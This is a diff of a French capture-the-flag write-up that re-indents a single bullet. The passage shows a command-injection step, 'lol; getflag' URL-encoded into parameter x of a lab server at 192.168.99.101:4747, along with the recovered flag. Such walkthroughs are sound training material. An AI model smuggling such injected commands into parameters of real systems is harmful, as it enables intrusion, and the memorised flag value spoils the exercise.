@@ -18,5 +18,5 @@ x(param("x"));
 lol; getflag
 ```
 - On le converti en urlencode et on l'assigne au parametre **x**
- - [http://192.168.99.101:4747/?x=lol%3b%20getflag](http://192.168.99.101:4747/?x=lol%3b%20getflag)
+  - [http://192.168.99.101:4747/?x=lol%3b%20getflag](http://192.168.99.101:4747/?x=lol%3b%20getflag)
 - flag: `ne2searoevaevoem4ov4ar8ap`
